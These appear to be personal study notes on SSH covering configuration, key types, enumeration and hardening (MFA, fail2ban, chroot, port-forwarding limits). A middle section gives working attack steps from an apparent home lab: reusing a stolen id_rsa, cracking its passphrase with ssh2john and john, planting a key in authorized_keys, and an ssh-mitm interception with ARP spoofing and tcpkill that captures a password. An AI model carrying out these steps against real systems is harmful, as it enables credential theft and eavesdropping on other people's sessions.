# Online installation of SSH server on windows (client is installed by default)
```
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
```

# SSH
1. Client-Server Architecture

Software
1. openssh-server
2. openssh-client

systemctl status ssh

# firewall config with ufw
ufw allow ssh

# configuration location
/etc/ssh/

# configuration files
```
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```

# SSH Key types
rsa
dsa
ecdsa
ed25519

# ECDSA = Elliptic Curve Digital Signature Algorithm


# Getting the fingerprint
in /etc/ssh/, there should be 3 `.pub` files
1. ssh_host_ecdsa_key.pub
2. ssh_host_ed25519_key.pub
3. ssh_host_rsa_key.pub

we can get their fingerprints using:
1. ssh-keygen -l -f -E sha256
2. ssh-keygen -l -f -E sha1
3. ssh-keygen -l -f -E md5

# ssh authentication
1. password
2. 

# insecure protcols like ssh
 telnet, rlogin


# changing default ssh port
going to `/etc/ssh/sshd_config` and changing the port value

# listen on IPV6
going to `/etc/ssh/sshd_config` and Listen Address

# ssh to IPV6 (note adding the '%' followed by the interface you're using)
`ssh -6 -p 2222 fe80::745f:d6dc:285e:7181%eth0`

# generating keys
ssh-keygen

# The `~/.ssh/known_hosts` file
Stores the public key if all the hosts you connected to using ssh  --> this is for preventing MitM attacks by verifying the host key before a connection is made

# key types
1. Host keys: authenticate hosts
2. Auhtorized/Identity keys: authenticate users

# get a list of a remote host's public key fingerprints
ssh-keyscan -H <REMOTE_IP>

output should look like:
```
# nix:22 SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
|1|Thg9Dj+i/wpGaOKqZvyabYfzFss=|0D/Ur+GvGhi8w6kG5DmO3NvZhmQ= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAED1vDfnYniezxKkvEIRISU8/at6fk6L+a3PcDQDHJR
# nix:22 SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
|1|B2/0fvE9eUQ2r02tDXvVr5ldMto=|NBjGtHUNk2LjOWE7yhW7AJ8Ym20= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCksP9kFhof1dNseOX988qjvF0joV9eH2W5lnvg9N56f1p+rqIPciTGC4GXjhC2qZAresjK9RrxBvkci3Kkfl2N0Uq8Aww/02rPeFcWFMewr29lpzW8MlFojeug1YVEdgXCY1zsej0+04Z0jCVwi8buZ8FAfh2We0yeHNxq3jAga9W1SQAZCx6/XIuxB1l7FtV5qk9oJ7P/GGzvRY+7Pm36aNxAPA0ICaU2FzaPn1XDjNE94uFvHXmmjafr9Oh4JaT0J8PzO4E+bISGhDcZ7zIE65i3cfS3ES1PZE1L4e1EuvklXvOcXqbmJUOkGbTplEn02BzEfO+SOCf5xiKL/dOPa182jnRe9Q87o0PTlUDdo5TVp5OoQya4ftRAboaR37GYMpbvrQLq7/f+h9xndBvzVVc359WcVpT/axbLXqfKkPyE93AQ9VKgxzZgbV1MDUoLy47DTXiozmn02X08dhVIZFZVwxekrk5kucneX/wy/0Hq1PINe3Q1TewSSZ1V37k=
# nix:22 SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
|1|MKLUJfebdPgNOGdbMXoZqgyABUk=|uZqcnqPzISzf99WqAW4461y5W28= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHOHlbbRgET4nxecDUlUcHRx1TA+8GNw9tWe0N/6BGiRCc0dZpQ5gWV4LidfsK0WsC8qL1M3X4iVmoPePYGUBR0=
# nix:22 SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
# nix:22 SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
```

# you can specifiy a specific algorith with `-t`
ssh-keyscan -t <ALGORITHM> -H <REMOTE_IP>

common algortithsm:
- ecdsa-sha2-nistp256
- ssh-ed25519
- ssh-rsa

# Disable password authentication
`PasswordAuthentication no`

# disable login as root

# Generate key
`ssh-keygen` command
# Default length is 3072 bits but Generate key with bigger lengths
max: 16384
Command: `ssh-keygen -b 16384` --> generting this took me 11 minutes (AMD Ryzen 7 processor) --> private key is 180 lines in length

# key types
dsa
ecdsa
ecdsa-sk
ed25519
ed25519-sk
rsa

after generating the keys, you will get a private key (id_rsa) and and public key (id_rsa.pub)
you will need to copy the content of the public key to `authorized_keys` in your `.ssh` folder

# Key exchange
If the sender and receiver wish to exchange encrypted messages,
	each must be equipped to encrypt messages to be sent and decrypt messages received.
The nature of the equipping they require depends on the encryption technique they might use.
If they use a code,
	both will require a copy of the same codebook.
If they use a cipher,
	they will need appropriate keys.
If the cipher is a symmetric key cipher,
	both will need a copy of the same key.
If it is an asymmetric key cipher with the public/private key property,
	both will need the other's public key. --> Diffie-Hellman key exchange

# Diffie–Hellman key exchange
In the Diffie–Hellman key exchange scheme,
	each party generates a public/private key pair and distributes the public key.

After obtaining an authentic copy of each other's public keys,
	Alice and Bob can compute a shared secret offline.

The shared secret can be used,
	for instance, as the key for a symmetric cipher.

# Perfect forward secrecty
feature of specific key agreement protocols that gives assurances that session keys will not be compromised even if long-term secrets used in the session key exchange are compromised. --> meaning: if you manage to get the private key of someone, you won't be able to get the session key, and if you even do that, the data is only available for decryption at a specific time frame.

# Enumeration: supported algorithms
## Command:
```
nmap -sV -p22 nix --script ssh2-enum-algos
```
## Output
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       sntrup761x25519-sha512@openssh.com
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|   server_host_key_algorithms: (4)
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
MAC Address: 00:0C:29:E3:A6:CD (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration: supported authenticated methods
## Command
```
nmap -sV -p22 nix --script ssh-auth-methods --script-args="ssh.user=root"
```
## Output
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-07 08:47 EDT
Nmap scan report for nix (20.20.20.132)
Host is up (0.00018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-auth-methods: 
|   Supported authentication methods: 
|_    publickey
MAC Address: 00:0C:29:E3:A6:CD (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration: usernames using CVE-2016-6210
## MSF module: auxiliary/scanner/ssh/ssh_enumusers

sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses BLOWFISH hashing on a static password when the username does not exist, which allows remote attackers to enumerate users by leveraging the timing difference between responses when a large password is provided

auxiliary/scanner/ssh/juniper_backdoor

# Exploitation
## Case #1: obtaining the SSH private key for a victim
if we can get a victim's `id_rsa` file that's usually in `/home/victim/.ssh/id_rsa`, we just need to:
1. save that key in a file on our attacker machine
2. change the permissons to be only readable/writable by our user `chmod 600 <KEY_FILE>`
3. ssh using the key `ssh -i <CORRECT_PERMISSIONS_KEY_FILE> <VICTIM_USER>@<VICTIM_MACHINE_IP>` 

## Cracking the id_rsa passphrase:
when generating a private/public key pair, you will be asked to enter a passphrase.
If you get a client's `id_rsa` private key file, you won't be able to use it unless you crack the passphrase.
This can be done using the `ssh2john` utility

Usage: `ssh2john id_rsa file > pass_phrase_hash`
`john pass_phrase_hash -w=/usr/share/wordlists/rockyou.txt`

## Case #2: writing/appending our own SSH public key to a victim's `authorized_keys` file
if we generate our own public/private key pair using `ssh-keygen`
and place our public key into the victim user's `authorized_keys` file, we can SSH as their user without problems.

## Case #3: SSH MiTM
Using the tool [ssh-mitm](https://github.com/jtesta/ssh-mitm), we can perform an SSH man-in-the-middle attacks

Here are the steps:
1. clone the git hub repository
```bash
git clone https://github.com/jtesta/ssh-mitm.git
```
2. go to the repo directory and run the installation bash script `install.sh`

Note: The tool would create another user called `ssh-mitm` where it would save any SSH/SFTP sessions.

there would be a SSH server listening locally on port 2222 on both IPv4/IPv6

Output of `netstat` shows it:

```
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      160319/sshd_mitm
tcp6       0      0 :::2222                 :::*                    LISTEN      160319/sshd_mitm
```

3. run the `JoesAwesomeSSHMITMVictimFinder.py` to find who's using ssh in the network

4. Run the tool using the `start.sh` script.

Output: the tool would set up IPV4 forwarding to prevent any denial of service
```
Running sshd_mitm in unprivileged account...
SSH MITM v2.3-dev starting (production mode)       
sshd_mitm is now running.                                                                                         
Enabling IP forwarding in kernel...                                                                               
Changing FORWARD table default policy to ACCEPT...
                                                         
Done!  Now ARP spoof your victims and watch /var/log/auth.log for credentials.  Logged sessions will be in /home/ssh-mitm/.  Hint: ARP spoofing can either be done with:
                                                                                                                  
        arpspoof -r -t 192.168.x.1 192.168.x.5                                                                    
                                                                                                                  
                OR                                                                                                
                                                                                                                  
        ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//
                                                         
If you don't have a list of targets yet, run stop.sh and use JoesAwesomeSSHMITMVictimFinder.py to find them.  Then run this script again.
```

5. Start ettercap, add your target to the target list and start spoofing ARP

6. Since you will only get credentials if the user is starting a connection, you might have to wait, But, if you want to target a user, you can use `tcpkill` from the `dnsniff` package to drop any TCP connections he has. But you have to stop the tool or else you will keep causing a denial of service on his device.

Usage: `tcpkill -9 host <TARGET_IP>`

7. when the use connects, they will get some output like below:
```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:HH/0EmHtimcai/7StVtQfBNpwUOK9zW0cKNCNfsOAZA.
Please contact your system administrator.
Add correct host key in C:\\Users\\<USERNAME>/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in C:\\Users\\<USERNAME>/.ssh/known_hosts:3
ED25519 host key for <SSH_SERVER_IP> has changed and you have requested strict checking.
Host key verification failed.
```

however, most users will clear their known_hosts file and would carry on

8. the captured credentials should be the last lines in `/var/log/auth.log` and any SSH/SFTP sessions would be in `/home/ssh-mitm/logs` like below:
```
┌──(root㉿kali)-[/home/ssh-mitm]
└─# ls -la log
total 32
drwxr-xr-x  2 ssh-mitm ssh-mitm 4096 Jul  7 11:25 .
drwx------ 10 ssh-mitm ssh-mitm 4096 Jul  7 10:58 ..
-rw-------  1 ssh-mitm ssh-mitm  160 Jul  7 11:19 client.log
-rw-------  1 ssh-mitm ssh-mitm  140 Jul  7 11:01 shell_session_0.txt
-rw-------  1 ssh-mitm ssh-mitm  140 Jul  7 11:05 shell_session_1.txt
-rw-------  1 ssh-mitm ssh-mitm  140 Jul  7 11:06 shell_session_2.txt
-rw-------  1 ssh-mitm ssh-mitm  140 Jul  7 11:19 shell_session_3.txt
-rw-------  1 ssh-mitm ssh-mitm 1302 Jul  7 11:24 shell_session_5.txt
```
```
┌──(root㉿kali)-[/home/ssh-mitm]
└─# cat log/shell_session_5.txt 
Time: 2022-07-07 15:23:22 GMT
Server: 20.20.20.132:22
Client: 20.20.20.130:53998
Username: zen
Password: Abc123!!
-------------------------
zen@zen-pc:~$ llss
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  Videos
zen@zen-pc:~$ wwhhooaammii
zen
zen@zen-pc:~$ eecchhoo  ""llooookk  sslliss  lliikkee  yyoo  ggouu  ggoott  mmee "  ::DD""
looks like you got me :D
zen@zen-pc:~$ eexxiitt
logout
```
### note: if the user only uses key authentication, and the SSH server doesn't accept password auth. the user won't be able to connect to SSH.
This is another reason to use key-based ssh authentication

9. After being done with the attack, Stop the ARP spoofing attack before stopping the the tool using `stop.sh`.

Output: the tool will put everything back in place asif nothing happened :D
```
Forcing termination...
Disabling IP forwarding in the kernel...
Executing: iptables -D INPUT -p tcp --dport 2222 -j ACCEPT
Executing: iptables -t nat -D PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222

Successfully stopped sshd_mitm daemon and disabled forwarding rules.
```

---

# Defense

# Enabling MFA  (this would make using GUI clients like FileZilla fail authentication. CLI clients like `sftp` should work fine)
Google Authenticator [guide](https://www.youtube.com/watch?v=wrx2cm3qDNI)
1. install google auth pam package `apt install libpam-google-authenticator`
2. run the app `google-authenticator`
3. Follow with the prompts and scan the QR code
4. add the following lings to `/etc/pam.d/sshd`
```
auth required pam_google_authenticator.so nullok
auth required pam_permit.so
```
5. add the below line to `/etc/ssh/sshd_config`
```
ChallengeResponseAuthentication yes
```
6. comment the below line in `/etc/ssh/sshd_config`
```
ChallengeResponseAuthentication yes
```
7. restart the ssh service `sytemctl restart ssh`
8. you should get a verification code prompt when logging in via SSH

## Note:

if you want to just enable key-based auth: put the below line in `/etc/ssh/sshd_config`
```
AuthenticationMethods publickey,password publickey,keyboard-interactive
```
and make sure the below line is commented in `/etc/pam.d/sshd`
```
# Standard Un*x authentication.
#@include common-auth  <----
```

---

# Fail2ban
## installation

`apt install fail2ban`

## main configuration file: `/etc/fail2ban/jail.conf`

however, we can configure a specific setup in `/etc/fail2ban/jail.d/ssh.conf`

```
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 120
ignoreip = <TRUSTED_IP>
```

## to apply changes, restart the service with `systemctl restart fail2ban`

---

# change authorized keys location and make it inaccessible by regular users (non-writable)
`AuthorizedKeysFile /etc/ssh/authorized-keys/%u`

meaning that the authorized keys for the "chris" user would in `/etc/ssh/authorized-keys/chris`

the file `chris` should be readable for this to work

---

# disabling port forwarding
```
AllowTcpForwarding no
AllowStreamLocalForwarding no
GatewayPorts no
PermitTunnel no
```
## You will not get a block when doing the forwarding with ssh. the error will happen when accessing the tunnel: Here's a sample output:
```
channel 2: open failed: administratively prohibited: open failed
```

---

# chrooting (jailing the incoming user into a directory)
1. create a directory for chrooting
2. create a dev directory and create the necessary devices
```
mknod -m 666 null c 1 3
mknod -m 666 tty c 5 0
mknod -m 666 zero c 1 5
mknod -m 666 random c 1 8
```
3. create a `bin` directory and copy the shell you want into it (ex: /bin/bash)
4. find the needed libraries for the shell using `ldd` (ex: ldd /bin/bash)
5. output should be like this when you run ldd against bash
```
# ldd /bin/bash
        linux-vdso.so.1 (0x00007ffcc7673000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f05aa9a8000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05aa780000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f05aab4a000)
```
6. create similar directories: `/lib64` and `/lib/x86_64-linux-gnu/` in the chrooted environment
7. copy all the libraries into their respective folder
8. repeat the same for any required command that's not built into the bash shell

---

# activating SFTP after creating the shroot environment
```
ForceCommand internal-sftp
```
## Note: this will remove ssh access:
```
This service allows sftp connections only.
Connection to nix closed.
```

---

# idle time
if you decide to limit an idle SSH connection to 2 minutes before disconnecting the client, you can configure it as follows:
```
ClientAliveInterval 40
ClientAliveCountMax 3
```
This sends 3 messages to your client (every 40 seconds) requesting some action, after 120 seconds without response the user will be logged out.

---

# Using a warning banner
## Example: 
```
***************************************************************************
                            NOTICE TO USERS

This computer system is the private property of its owner, whether
individual, corporate or government.  It is for authorized use only.
Users (authorized or unauthorized) have no explicit or implicit
expectation of privacy.

Any or all uses of this system and all files on this system may be
intercepted, monitored, recorded, copied, audited, inspected, and
disclosed to your employer, to authorized site, government, and law
enforcement personnel, as well as authorized officials of government
agencies, both domestic and foreign.

By using this system, the user consents to such interception, monitoring,
recording, copying, auditing, inspection, and disclosure at the
discretion of such personnel or officials.  Unauthorized or improper use
of this system may result in civil and criminal penalties and
administrative or disciplinary action, as appropriate. By continuing to
use this system you indicate your awareness of and consent to these terms
and conditions of use. LOG OFF IMMEDIATELY if you do not agree to the
conditions stated in this warning.

****************************************************************************
```

in `sshd_config`, use the below directive:
```
Banner /location/of/WarningMessage
```